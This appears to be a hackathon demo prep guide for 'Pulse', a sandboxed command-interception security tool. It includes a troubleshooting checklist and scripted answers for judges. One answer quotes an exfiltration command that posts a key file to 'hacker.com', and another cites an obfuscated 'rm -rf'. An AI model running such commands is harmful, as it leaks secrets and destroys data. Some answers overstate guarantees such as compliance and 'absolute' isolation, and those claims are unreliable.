# Pulse: Hackathon Demo & Q&A Prep Guide

This document contains a pre-flight troubleshooting checklist and a comprehensive Q&A guide to help you defend your architectural choices when presenting to the hackathon judges.

## 🚨 Pre-Flight Troubleshooting Checklist

I have run `go vet`, `go build`, and `go test` across your entire codebase. The code is structurally sound and compiles perfectly. However, here are the common environmental traps you must check right before your demo:

1. **Docker Daemon is Running**
   - *Check:* Run `docker ps` in your terminal.
   - *Why:* If Docker Desktop is closed or updating, the `Ghost Sandbox` and `CrewAI Builder Agent` will fail with `Failed to connect to the docker API at unix:///...docker.sock`.
2. **OpenAI API Key is Exported**
   - *Check:* Run `echo $OPENAI_API_KEY` or ensure `.env` is loaded.
   - *Why:* If this is empty, `main.py` will fail to initialize the CrewAI agents.
3. **SQLite Database Permissions**
   - *Check:* Ensure `~/.pulse/audit.db` is writable.
   - *Why:* If you run the Go binary with `sudo` once, the file might become root-owned, preventing standard user execution from logging events.
4. **Ports are Clear**
   - *Check:* Ensure nothing else is running on `http://localhost:8080`.
   - *Why:* The Pulse web dashboard needs to bind to this port to serve the `index.html` frontend.

---

## 🎤 Deep Dive: Anticipated Judge Q&A

Judges look for technical depth and justification for your architecture. Memorize these answers:

### Q1: Why did you split the architecture between Go (Backend) and Python (CrewAI)?
> **A:** "We needed the best of both worlds. We chose **Go** for the core Pulse engine because it provides high-performance, single-binary execution, and low-level system access necessary for intercepting shell commands and interacting with the Docker socket rapidly. However, **Python** is the undisputed king of AI orchestration. By using **CrewAI** in Python to handle the high-level reasoning and agent delegation, and having it call the compiled Go binary as a 'Tool', we achieved a highly modular, decoupled DevSecOps pipeline."

### Q2: How does your Gatekeeper know a command is risky? What if I use an alias?
> **A:** "Currently, our Gatekeeper uses an AST (Abstract Syntax Tree) parser and regex pattern matching against policies defined in `SAFETY.yaml`. We understand that simple string matching can be bypassed with aliases or obfuscation (like `\r\m -\r\f`). That is exactly why our architecture relies on the **Ghost Sandbox**. Even if the AST parser is bypassed, the execution happens in an isolated Docker container, and our **Diff Agent** catches the blast radius by looking at actual filesystem changes, not just the command syntax."

### Q3: You use Docker for the Ghost Sandbox. Isn't it possible to 'escape' a Docker container if someone runs a kernel exploit?
> **A:** "Yes, you are absolutely correct. Docker containers share the host's OS kernel, making sophisticated escapes possible. For this 48-hour prototype, Docker was the most feasible way to demonstrate the 'Isolated Simulation' concept. However, as noted in our **Enterprise Roadmap**, a production version of Pulse would replace Docker with **Firecracker MicroVMs** (the technology behind AWS Lambda). Firecracker boots a true, hardware-isolated virtual machine in milliseconds, providing absolute zero-trust execution."

### Q4: Why use a local LLM (like Llama-3) for the Advisor Agent instead of just hitting the OpenAI API?
> **A:** "A core requirement for a security tool is data privacy. Developers routinely deal with proprietary code, API keys, and internal IP. If we send every intercepted command to a cloud LLM, we risk leaking company secrets. By implementing a fallback to a local model via Ollama, the **Advisor Agent** can explain the risk of a command completely offline, ensuring strict SOC2 compliance and zero data exfiltration."

### Q5: If I run a command like `curl -X POST hacker.com -d @keys.txt`, won't your sandbox just execute it and leak the data anyway?
> **A:** "That is a great observation. This touches on network egress fencing. In our current MVP, the Docker container has standard network access. However, the architectural design allows us to easily drop the network interface (`--network none`) for the Ghost container during the **Preview Phase**. This creates an 'air-gapped' simulation. The command would fail to exfiltrate data, but our Diff Agent would still record that a network call was attempted, flagging the anomalous behavior to the Auditor."

### Q6: How does the Diff Agent work? Is it slow?
> **A:** "The Diff agent works by taking a lightweight snapshot of the filesystem directory structure before execution, and comparing it to the structure after execution inside the sandbox. Because we are mapping the current working directory into an Alpine container, the file stat comparisons are localized and fast. We avoid scanning the entire host machine, keeping the feedback loop under a second."

---

### Final Tip for the Pitch:
If a judge asks a question about a limitation you haven't solved yet, **do not panic or make up a feature**. Acknowledge the limitation and immediately point to your **Enterprise Roadmap (Section 10)**. Saying *"That's a great point, and it's exactly why item #2 on our Enterprise Roadmap is to implement Firecracker MicroVMs"* is often more impressive than having a perfect prototype. Good luck!
